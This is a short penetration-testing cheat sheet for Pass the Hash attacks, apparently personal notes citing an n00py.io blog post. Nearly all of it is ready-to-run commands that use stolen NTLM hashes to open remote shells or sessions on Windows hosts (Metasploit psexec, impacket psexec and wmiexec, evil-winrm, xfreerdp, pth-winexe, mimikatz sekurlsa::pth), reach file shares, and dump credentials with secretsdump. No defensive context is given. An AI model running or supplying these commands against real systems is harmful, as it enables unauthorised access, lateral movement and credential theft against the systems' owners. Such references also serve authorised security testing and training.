# Pass The Hash
-------
https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/

LM Hash: AAD3B435B51404EEAAD3B435B51404EE

```bash
msf > use exploit/windows/smb/psexec
```

psexec
```bash
python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:08df3c73ded940e1f2bcf5eea4b8dbf6 tris@10.11.1.20 cmd.exe
```

cme
```bash
cme smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local
```

wmiexec
```bash
wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

winrm
```bash
evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
```

xfreerdp
```bash
xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
```

LDAP
```bash
secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
```

smbclient
```txt
smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
```

```bash
./pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

Over pass the hash using mimikatz
```cmd
sekurlsa::pth /user:Administrator /domain: /ntlm: /run:Powershell.exe
```

```cmd
.\PsExec.exe \\10.11.1.20 cmd 
```

